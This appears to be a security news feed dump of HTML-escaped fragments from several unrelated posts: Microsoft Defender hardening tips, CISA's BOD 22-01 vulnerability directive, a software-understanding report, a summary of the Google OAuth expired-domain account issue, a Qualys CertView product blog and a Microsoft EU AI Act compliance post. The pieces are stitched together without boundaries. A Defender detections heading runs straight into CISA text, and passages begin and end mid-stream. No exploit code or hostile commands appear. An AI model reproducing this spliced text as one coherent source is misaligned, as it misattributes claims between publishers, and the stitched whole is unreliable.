&lt;li&gt;&lt;a href="https://learn.microsoft.com/defender-endpoint/detect-block-potentially-unwanted-apps-microsoft-defender-antivirus"&gt;Turn on PUA protection in block mode&lt;/a&gt; in Microsoft Defender Antivirus&lt;/li&gt;



&lt;li&gt;Turn on &lt;a href="https://learn.microsoft.com/defender-endpoint/cloud-protection-microsoft-defender-antivirus"&gt;cloud-delivered protection&lt;/a&gt; in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques.&lt;/li&gt;



&lt;li&gt;Turn on Microsoft Defender Antivirus &lt;a href="https://learn.microsoft.com/defender-endpoint/configure-real-time-protection-microsoft-defender-antivirus"&gt;real-time protection&lt;/a&gt;.&lt;/li&gt;



&lt;li&gt;Encourage users to use Microsoft Edge and other web browsers that support &lt;a href="https://learn.microsoft.com/defender-endpoint/web-protection-overview"&gt;SmartScreen&lt;/a&gt;, which identifies and blocks malicious websites, including phishing sites, scam sites, and sites that host malware.&lt;/li&gt;



&lt;li&gt;Turn on &lt;a href="https://learn.microsoft.com/defender-office-365/safe-links-about"&gt;Safe Links&lt;/a&gt; and &lt;a href="https://learn.microsoft.com/defender-office-365/safe-attachments-about"&gt;Safe Attachments&lt;/a&gt; for Office 365.&lt;/li&gt;



&lt;li&gt;Use the &lt;a href="https://learn.microsoft.com/defender-office-365/attack-simulation-training-get-started"&gt;Attack Simulator&lt;/a&gt; in Microsoft Defender for Office 365 to run realistic, yet safe, simulated phishing and password attack campaigns. Utilize the &lt;a href="https://learn.microsoft.com/defender-office-365/attack-simulation-training-payloads#qr-code-payloads"&gt;QR code payload&lt;/a&gt; in attack simulation training scenarios to mirror Star Blizzard’s and other threat actor’s QR code spear-phishing techniques.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="microsoft-defender-xdr-detections"&gt;Microsoft Defender XDR detections&lt;/h2&gt;

&lt;/ul&gt;
&lt;p&gt;These types of vulnerabilities are frequent attack vectors for malicious cyber actors and pose significant risks to the federal enterprise.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.cisa.gov/binding-operational-directive-22-01" title="Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities"&gt;Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities&lt;/a&gt;&amp;nbsp;established the Known Exploited Vulnerabilities Catalog as a living list of known Common Vulnerabilities and Exposures (CVEs) that carry significant risk to the federal enterprise. BOD 22-01 requires Federal Civilian Executive Branch (FCEB) agencies to remediate identified vulnerabilities by the due date to protect FCEB networks against active threats. See the&lt;a&gt;&amp;nbsp;&lt;/a&gt;&lt;a href="https://www.cisa.gov/sites/default/files/publications/Reducing_the_Significant_Risk_of_Known_Exploited_Vulnerabilities_211103.pdf" title="BOD 22-01 Fact Sheet"&gt;BOD 22-01 Fact Sheet&lt;/a&gt;&amp;nbsp;for more information.&lt;/p&gt;
&lt;p&gt;Although BOD 22-01 only applies to FCEB agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of&amp;nbsp;&lt;a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" title="Catalog vulnerabilities"&gt;Catalog vulnerabilities&lt;/a&gt;&amp;nbsp;as part of their vulnerability management practice.

This report urgently implores the U.S. government to take decisive and coordinated action.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;Software understanding refers to assessing software-controlled systems across all conditions. Mission owners and operators often lack adequate capabilities for software understanding because technology manufacturers build software that greatly outstrips the ability to understand it. This gap, along with the lack of secure by design software being created by technology manufacturers, can lead to the exploitation of software vulnerabilities.&lt;/p&gt;
&lt;p&gt;&amp;nbsp;The U.S. government has engaged in activities that have paved the way toward improving software understanding, including research investments, mission agency initiatives, and policy actions. This report further explores the opportunity for enhanced coordination to strengthen technical foundations and progress towards a more vigorous understanding of software on a national scale.

Relatedly, lots of business-minded webapps use Google's OAuth, i.e. "Sign in with Google." It's a low-friction feedback loop—up until the startup fails, the domain goes up for sale, and somebody forgot to close down all the Google stuff.&lt;/p&gt;
&lt;p&gt;Dylan Ayrey, of Truffle Security Co., &lt;a href="https://trufflesecurity.com/blog/millions-at-risk-due-to-google-s-oauth-flaw"&gt;suggests in a report&lt;/a&gt; that this problem is more serious than anyone, especially Google, is acknowledging. Many startups make the critical mistake of not properly closing their accounts—on both Google and other web-based apps—before letting their domains expire.&lt;/p&gt;
&lt;p&gt;Given the number of people working for tech startups (6 million), the failure rate of said startups (90 percent), their usage of Google Workspaces (50 percent, all by Ayrey's numbers), and the speed at which startups tend to fall apart, there are a lot of Google-auth-connected domains up for sale at any time. That would not be an inherent problem, except that, as Ayrey shows, buying a domain with a still-active Google account can let you re-activate the Google accounts for former employees.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/security/2025/01/startup-necromancy-dead-google-apps-domains-can-be-compromised-by-new-owners/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Everything we do in the digital world relies on certificates. Whether this is accessing services using our computer or phone, for work or for leisure—certificates are ubiquitous.&lt;/p&gt;



&lt;p&gt;However, for many organizations, managing digital certificates can pose a major challenge. It can be extremely difficult to keep track of expiry dates, chains of trust, and encryption requirements.&lt;/p&gt;



&lt;p&gt;Not a single organization is immune to the risks arising due to poorly managed certificates. Even well-known companies have suffered outages due to flaws in the process of managing digital certificates, sometimes amounting to millions of lost customer hours.&lt;/p&gt;



&lt;p&gt;In this blog, we will see how Qualys Certificate View (CertView) helps security teams gain complete visibility into their digital certificates and their underlying configurations— regardless of location, business unit, or operational silo.&lt;/p&gt;



&lt;span id="more-37063"&gt;&lt;/span&gt;



&lt;p&gt;CertView is provided free for all Qualys VMDR customers, is tightly integrated with the Web Application Scanning (WAS) and External Attack Surface Management (EASM) modules of Qualys, uses existing Qualys sensors, and provides actionable insights “out of the box.”&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="how-does-qualys-certview-help-you-reduce-risk"&gt;How Does Qualys CertView Help You Reduce Risk?&lt;/h2&gt;



&lt;p&gt;Qualys CertView helps you better measure, communicate, and eliminate risk for your business. Here’s how:&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="for-measurement-certview-goes-beyond-expired-certificates"&gt;For Measurement: CertView Goes Beyond Expired Certificates&lt;/h2&gt;



&lt;p&gt;CertView enables you to gain insights about which of your certificates are insecure, using weak encryptions/unsupported protocols such as SSLv2/SSLv3 or TLSv1. Most organizations have adopted TLSv1.3 as the standard for better security and improved handshake performance.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-1.png"&gt;&lt;img alt="" class="wp-image-37064" height="732" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-1.png" width="1414" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1: Dashboard Widget showing the distribution of TLS protocol versions in use&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Qualys CertView has a very comprehensive coverage of detecting certificates across your estates, such as on-premises/external network, workstations, cloud instances, and Qualys Cloud Agents. This gives you complete visibility of certificates issued by approved/trusted Certificate Authorities (CAs) and self-signed CAs. With the latest updates, you can now also monitor certificates for root and intermediate CAs.&lt;/p&gt;



&lt;p&gt;If you are a VMDR customer using the Windows Cloud Agent, contact your TAM or the Customer Support Team for activation. Support for CertView on the Linux Cloud Agent is planned for upcoming quarters.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-2.png"&gt;&lt;img alt="" class="wp-image-37065" height="732" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-2.png" style="width: 457px; height: auto;" width="654" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2: Dashboard widget showing the distribution of certificate types&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-3.png"&gt;&lt;img alt="" class="wp-image-37066" height="594" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-3.png" width="1868" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3: CertView shows the CA chain of trust&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="certview-free-licensing-model-external-scans-certificate-visibility"&gt;CertView Free Licensing Model – External Scans &amp;amp; Certificate Visibility&lt;/h2&gt;



&lt;p&gt;With the CertView Free licensing model, you can perform unlimited external scans to monitor certificates exposed to the internet. This feature ensures that you have complete visibility into the state of your certificates, both internal and external, allowing you to proactively manage certificate expirations and avoid downtime or security vulnerabilities.&lt;/p&gt;



&lt;p&gt;Key benefits of this model include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Unlimited External Scans: Leverage the capability to continuously scan your publicly exposed assets for certificate issues, ensuring timely remediation.&lt;/li&gt;



&lt;li&gt;Comprehensive Visibility: Get a complete view of all certificates, whether internal or external, to better track expiration dates, vulnerabilities, and compliance.&lt;/li&gt;



&lt;li&gt;Proactive Management: Take corrective actions before certificates expire, reducing the risk of service interruptions and security breaches.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This enables you to manage and secure their certificate infrastructure more efficiently, ensuring that any issues are identified and addressed promptly.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="weak-certificates-are-categorized-for-you"&gt;Weak Certificates Are Categorized for You&lt;/h2&gt;



&lt;p&gt;For every instance of the certificates detected, based on running port/services, you can see the grades for each of the certificates. Keeping yourself up to date with security protocols and technologies is not necessary, as CertView uses a simple grading system that allows administrators to quickly assess the very real risk incurred by using weaker cipher suites, older protocols, and poorer key exchange parameters.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-4.png"&gt;&lt;img alt="" class="wp-image-37067" height="732" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-4.png" style="width: 444px; height: auto;" width="654" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4: Dashboard widget showing certificates of all grades&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The grades for every certificate are based on multiple parameters/scoring methods such as Certificate Issuer, Protocol Strength, Key Exchange, Cipher Strength, and Cipher Suites. Here is an example of an evaluation for one such certificate:&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-5.png"&gt;&lt;img alt="" class="wp-image-37068" height="1412" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-5.png" width="2922" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5: Screenshot showing details of a certificate grade&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;You can explore the technical, internal logic of how the grading by heading over to &lt;a href="https://www.ssllabs.com/index.html"&gt;ssllabs.com&lt;/a&gt;. SSL Labs also provides a free certificate check for anyone to use anytime!&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="to-communicate-easily-manage-the-certificate-lifecycle"&gt;To Communicate: Easily Manage the Certificate Lifecycle&lt;/h2&gt;



&lt;p&gt;CertView not only stops expired certificates from causing an outage but also gives you advanced warning as to which certificates will expire soon. Figure 6 shows how easy it can be – with dashboard widgets that highlight the riskiest assets with expired and expiring certificates.&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-37070" height="142" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-6-1070x142.png" width="1070" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6: Dashboard Widget displaying the number of expired and expiring certificates on the riskiest assets.&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;You can deploy (and bulk deploy), renew, and automatically renew certificates issued by Digicert, Mocana, and GeoTrust. Going one step further, Qualys CertView will soon make use of the Automatic Certificate Management Environment (&lt;a href="https://datatracker.ietf.org/doc/html/rfc8555"&gt;RFC 8555&lt;/a&gt;) to fully automate the certificate lifecycle.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full is-resized"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-7.png"&gt;&lt;img alt="" class="wp-image-37071" height="686" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-7.png" style="width: 287px; height: auto;" width="404" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7: Renew feature in CertView&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="enforce-organizational-standards"&gt;Enforce Organizational Standards&lt;/h2&gt;



&lt;p&gt;With CertView, you can enforce organizational standards by creating a baseline inventory of all certificates in the enterprise. You can clearly see how many certificates are out of compliance or don’t follow organizational policies for key length, signature algorithms, or the use of trusted and approved Certificate Authorities.&lt;/p&gt;

&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-37072" height="738" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-8.png" style="width: 478px; height: auto;" width="914" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8. Dashboard widget displaying the number of unapproved certificates.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Communicating any upcoming certificate expirations to the stakeholders is critical, and you can configure alerting rules to get notified via Email, Slack, or PagerDuty.&lt;/p&gt;



&lt;p&gt;We will recommend configuring various alerts based on expirations like 7 days, 30 days, or even 90 days. This ensures your certificate owners do not miss these alerts and that certificates are renewed in a timely fashion.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-9.png"&gt;&lt;img alt="" class="wp-image-37073" height="1154" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-9.png" width="1910" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9: Easy-to-configure alerting rules&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="to-eliminate-enroll-or-renew-your-certificates-with-digicert-renewal"&gt;&lt;strong&gt;To Eliminate: Enroll or Renew Your Certificates with DigiCert Renewal&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;With the integrated renewal process in Certificate View, you can use the&amp;nbsp;&lt;a href="https://docs.qualys.com/en/certview/latest/certificates/enroll_renew_certs.htm"&gt;&lt;strong&gt;enrollment&lt;/strong&gt;&lt;/a&gt;&amp;nbsp;options to initiate the renewal process for certificates that are about to expire. This workflow assists in sending a renewal request to DigiCert. You can enroll, renew, and even auto-renew certificates issued by DigiCert, as well as those from DigiCert acquisitions such as Thawte, Mocana, and GeoTrust. This streamlined process ensures that your certificates remain up-to-date and compliant with security standards.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-10.png"&gt;&lt;img alt="" class="wp-image-37074" height="672" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/Figure-10.png" width="2564" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10: Certificate Enrollment DigiCert Renewal&lt;/figcaption&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="certificate-view-rapid-certificate-deployment-option"&gt;&lt;strong&gt;Certificate View Rapid Certificate Deployment Option&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;The latest Certificate View release enables bulk deployment of certificates using the Qualys Cloud Agent for upcoming certificate expiration, allowing proactive remediation. You can reach out to your Technical Account Manager to activate this feature.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image002-1.png"&gt;&lt;img alt="" class="wp-image-37088" height="1664" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image002-1.png" width="3440" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11: CertView enables you to deploy certificates to multiple assets using a wizard&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;Certificate View allows you to deploy certificates to endpoints in collaboration with the Qualys Cloud Agent, providing proactive remediation for upcoming certificate expirations.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="certview-actionable-dashboard"&gt;&lt;strong&gt;CertView &lt;/strong&gt;&lt;strong&gt;Actionable&lt;/strong&gt; &lt;strong&gt;Dashboard&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;The fastest way to gain insights into your CertView is to download and import the latest CertView Actionable Dashboard into your subscription.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/CertView-Dashboard.png"&gt;&lt;img alt="" class="wp-image-37075" height="974" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/CertView-Dashboard.png" width="1102" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12: CertView Actionable Dashboard&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;CertView Actionable Dashboard is available here –&amp;nbsp;&lt;a href="https://qualys-my.sharepoint.com/:u:/p/rramachandran/EXj7O9zBXhpDqFM06lQiwpsB1QHRSTz4hDoD_sGqKBewAw?e=pm1fbN"&gt;&lt;strong&gt;Download the Dashboard&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;



&lt;p&gt;This dashboard enables a quick assessment of all your organization’s certificates and the risks associated with upcoming expirations. It significantly accelerates the process and focuses on the most urgent items to mitigate risks rapidly.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="whats-upcoming-in-certificate-view-automated-certificate-renewal"&gt;&lt;strong&gt;What’s upcoming in Certificate View &amp;#8211; Automated Certificate Renewal&lt;/strong&gt;&lt;/h2&gt;



&lt;p&gt;Qualys Certificate View is expanding its capabilities to support renewals using the Automated Certificate Management Environment (ACME) protocol, enabling automation of the issuance and renewal of certificates. You can create a Certificate Signing Request (CSR) that involves generating a server-side request that must be copied and pasted into a field for your CA. After that, the agent can download and install the certificate and inform the assigned contact about it.&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;a href="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image004-1.png"&gt;&lt;img alt="" class="wp-image-37091" height="3218" src="https://ik.imagekit.io/qualys/wp-content/uploads/2025/01/image004-1.png" width="3456" /&gt;&lt;/a&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13: CertView CSR &amp;amp; Certificate Issuance Job&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;This will address the need for Certificate Lifecycle Management.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="next-steps"&gt;Next Steps&lt;/h2&gt;



&lt;p&gt;If you are already a Qualys VMDR customer, click on the application menu and select Certificate View to begin the journey. You will find that your certificates have already been added, assessed, and graded!

&lt;p&gt;The post &lt;a href="https://blogs.microsoft.com/on-the-issues/?p=66749"&gt;Innovating in line with the European Union&amp;#8217;s AI Act &lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;As our&amp;nbsp;&lt;a href="https://aitour.microsoft.com/en-US/home"&gt;Microsoft AI Tour&lt;/a&gt;&amp;nbsp;reached Brussels, Paris, and Berlin toward the end of last year, we met with European organizations that were energized by the possibilities of our latest AI technologies and engaged in deployment projects. They were also alert to the fact that 2025 is the year that key obligations under the European Union’s AI Act come into effect, opening a new chapter in digital regulation as the world’s first, comprehensive AI law becomes a reality.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;At Microsoft, we are ready to help our customers do two things at once: innovate with AI and comply with the EU AI Act.&amp;nbsp;We are building our products and services to comply with our obligations under the EU AI Act and working with our customers to help them deploy and use the technology compliantly. We are also engaged with European policymakers to support the development of efficient and effective implementation practices under the EU AI Act that are aligned with emerging international norms.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Below, we go into more detail on these efforts. Since the dates for compliance with the EU AI Act are staggered and key implementation details are not yet finalized, we will be publishing information and tools on an ongoing basis. You can consult our EU AI Act documentation on the&amp;nbsp;&lt;a href="http://aka.ms/euaiact"&gt;Microsoft Trust Center&lt;/a&gt;&amp;nbsp;to stay up to date.&amp;nbsp;&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="building-microsoft-products-and-services-that-comply-with-the-eu-ai-act"&gt;Building Microsoft products and services that comply with the EU AI Act&amp;nbsp;&lt;/h3&gt;



&lt;p&gt;Organizations around the world use Microsoft products and services for innovative AI solutions that empower them to achieve more. For these customers, particularly those operating globally and across different jurisdictions, regulatory compliance is of paramount importance. This is why, in every customer agreement, Microsoft has committed to comply with all laws and regulations applicable to Microsoft. This includes the EU AI Act. It is also why we made early decisions to build and continue to invest in our AI governance program.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;As outlined in our inaugural&amp;nbsp;&lt;a href="http://aka.ms/raitransparencyreport2024pdf"&gt;Transparency Report&lt;/a&gt;, we have adopted a risk management approach that spans the entire AI development lifecycle. We use practices like impact assessments and red-teaming to help us identify potential risks and ensure that teams building the highest-risk models and systems receive additional oversight and support through governance processes, like our Sensitive Uses program. After mapping risks, we use systematic measurement to evaluate the prevalence and severity of risks against defined metrics. We manage risks by implementing mitigations like the classifiers that form part of&amp;nbsp;&lt;a href="https://azure.microsoft.com/en-us/products/ai-services/ai-content-safety/"&gt;Azure AI Content Safety&lt;/a&gt;&amp;nbsp;and ensuring ongoing monitoring and incident response.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Our framework for guiding engineering teams building Microsoft AI solutions—the&amp;nbsp;&lt;a href="https://go.microsoft.com/fwlink/?linkid=2272645&amp;amp;clcid=0x409&amp;amp;culture=en-us&amp;amp;country=us"&gt;Responsible AI Standard&lt;/a&gt;—was drafted with an early version of the EU AI Act in mind.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Building on these foundational components of our program, we have devoted significant resources to implementing the EU AI Act across Microsoft. Cross-functional working groups combining AI governance, engineering, legal, and public policy experts have been working for months to identify whether and how our internal standards and practices should be updated to reflect the final text of the EU AI Act as well as early indications of implementation details. They have also been identifying any additional engineering work needed to ensure readiness. &amp;nbsp;&lt;/p&gt;



&lt;p&gt;For example, the EU AI Act’s prohibited practices provisions are among the first provisions to come into effect in February 2025. Ahead of the European Commission’s newly established AI Office providing additional guidance, we have taken a proactive, layered approach to compliance. This includes:​&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Conducting a thorough review of Microsoft-owned systems &lt;/strong&gt;already on the market to identify any places where we might need to adjust our approach, including by updating documentation or implementing technical mitigations.​ To do this, we developed a series of questions designed to elicit whether an AI system could implicate a prohibited practice and dispatched this survey to our engineering teams via our central tooling. Relevant experts reviewed the responses and followed up with teams directly where further clarity or additional steps were necessary. These screening questions remain in our central responsible AI workflow tool on an ongoing basis, so that teams working on new AI systems answer them and engage the review workflow as needed.  &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Creating new restricted uses &lt;/strong&gt;in our internal company policy to ensure Microsoft does not design or deploy AI systems for uses prohibited by the EU AI Act.​ We are also developing specific marketing and sales guidance to ensure that our general-purpose AI technologies are not marketed or sold for uses that could implicate the EU AI Act’s prohibited practices.  &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Updating our contracts, &lt;/strong&gt;including our &lt;a href="https://learn.microsoft.com/en-us/legal/cognitive-services/openai/code-of-conduct"&gt;Generative AI Code of Conduct&lt;/a&gt;, so that our customers clearly understand they cannot engage in any prohibited practices.​ For example, the Generative AI Code of Conduct now has an express prohibition on the use of the services for social scoring. &lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;We were also among the first organizations to sign up to the three core commitments in the&amp;nbsp;&lt;a href="https://digital-strategy.ec.europa.eu/en/policies/ai-pact#ecl-inpage-What-is-the-AI-Pact?"&gt;AI Pact&lt;/a&gt;, a set of voluntary pledges developed by the AI Office to support regulatory readiness ahead of some of the upcoming compliance deadlines for the EU AI Act. In addition to our regular rhythm of publishing annual Responsible AI Transparency Reports, you can find an overview of our approach to the EU AI Act and a more detailed summary of how we are implementing the prohibited practices provisions on the Microsoft Trust Center.&amp;nbsp;&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="working-with-customers-to-help-them-deploy-and-use-microsoft-products-and-services-in-compliance-with-the-eu-ai-act"&gt;Working with customers to help them deploy and use Microsoft products and services in compliance with the EU AI Act&amp;nbsp;&lt;/h3&gt;



&lt;p&gt;One of the core concepts of the EU AI Act is that obligations need to be allocated across the AI supply chain. This means that an upstream regulated actor, like Microsoft in its capacity as a provider of AI tools, services, and components, must support downstream regulated actors, like our enterprise customers, when they integrate a Microsoft tool into a high-risk AI system. We embrace this concept of shared responsibility and aim to support our customers with their AI development and deployment activities by sharing our knowledge, providing documentation, and offering tooling. This all ladders up to the&amp;nbsp;&lt;a href="https://blogs.microsoft.com/blog/2023/06/08/announcing-microsofts-ai-customer-commitments/"&gt;AI Customer Commitments&lt;/a&gt;&amp;nbsp;that we made in June of last year to support our customers on their responsible AI journeys.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;We will continue to publish documentation and resources related to the EU AI Act on the Microsoft Trust Center to provide updates and address customer questions. Our&amp;nbsp;&lt;a href="https://www.microsoft.com/en-us/ai/tools-practices"&gt;Responsible AI Resources site&lt;/a&gt;&amp;nbsp;is also a rich source of tools, practices, templates, and information that we believe will help many of our customers establish the foundations of good governance to support EU AI Act compliance.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;On the documentation front, the 33 Transparency Notes that we have published since 2019 provide essential information about the capabilities and limitations of our AI tools, components, and services that our customers rely on as downstream deployers of Microsoft AI platform services. We have also published documentation for our AI systems, such as answers to frequently asked questions. Our&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/legal/cognitive-services/openai/transparency-note?tabs=text"&gt;Transparency Note for the Azure OpenAI Service&lt;/a&gt;, an AI platform service, and&amp;nbsp;&lt;a href="https://www.microsoft.com/en-us/microsoft-copilot/learn/?form=MA13FV#faq-group"&gt;FAQ for&amp;nbsp;Copilot&lt;/a&gt;, an AI system, are examples of our approach.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;We expect that several of the secondary regulatory efforts under the EU AI Act will provide additional guidance on model- and system-level documentation. These norms for documentation and transparency are still maturing and would benefit from further definition consistent with efforts like the&amp;nbsp;&lt;a href="https://innovazione.gov.it/notizie/articoli/en/g7-digital-tech-working-group-finalizes-reporting-framework-for-advanced-ai-syste/"&gt;Reporting Framework&lt;/a&gt;&amp;nbsp;for the Hiroshima AI Process International Code of Conduct for Organizations Developing Advanced AI Systems. Microsoft has been pleased to contribute to this Reporting Framework through a process convened by the OECD and looks forward to its forthcoming public release.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Finally, because tooling is necessary to achieve consistent and efficient compliance, we make available to our customers versions of the tools that we use for our own internal purposes.&amp;nbsp;These tools include&amp;nbsp;&lt;a href="https://www.microsoft.com/en-us/security/business/risk-management/microsoft-purview-compliance-manager?ef_id=_k_66d10a07937b116af3526d2a9723f6aa_k_&amp;amp;OCID=AIDcmmdamuj0pc_SEM__k_66d10a07937b116af3526d2a9723f6aa_k_&amp;amp;msclkid=66d10a07937b116af3526d2a9723f6aa"&gt;Microsoft Purview Compliance Manager&lt;/a&gt;, which helps customers understand and take steps to improve compliance capabilities across many regulatory domains, including the EU AI Act;&amp;nbsp;&lt;a href="https://azure.microsoft.com/en-us/products/ai-services/ai-content-safety/"&gt;Azure AI Content Safety&lt;/a&gt;&amp;nbsp;to help mitigate content-based harms;&amp;nbsp;&lt;a href="https://azure.microsoft.com/en-us/products/ai-studio/"&gt;Azure AI Foundry&lt;/a&gt;&amp;nbsp;to help with evaluations of generative AI applications; and&amp;nbsp;&lt;a href="https://www.microsoft.com/en-us/security/blog/2024/02/22/announcing-microsofts-open-automation-framework-to-red-team-generative-ai-systems/"&gt;Python Risk Identification Tool or PyRIT&lt;/a&gt;, an open innovation framework that our independent AI Red Team uses to help identify potential harms associated with our highest-risk AI models and systems.&amp;nbsp;&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="helping-to-develop-efficient-effective-and-interoperable-implementation-practices"&gt;Helping to develop efficient, effective, and interoperable implementation practices&amp;nbsp;&lt;/h3&gt;



&lt;p&gt;A unique feature of the EU AI Act is that there are more than 60 secondary regulatory efforts that will have a material impact on defining implementation expectations and directing organizational compliance. Since many of these efforts are in progress or yet to get underway, we are in a key window of opportunity to help establish implementation practices that are efficient, effective, and aligned with emerging international norms.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Microsoft is engaged with the central EU regulator, the AI Office, and other relevant authorities in EU Member States to share insights from our AI development, governance, and compliance experience, seek clarity on open questions, and advocate for practical outcomes. We are also participating in the development of the Code of Practice for general-purpose AI model providers, and we remain longstanding contributors to the technical standards being developed by European Standards organizations, such as CEN and CENELEC, to address high-risk AI system requirements in the EU AI Act.&amp;nbsp;&lt;/p&gt;



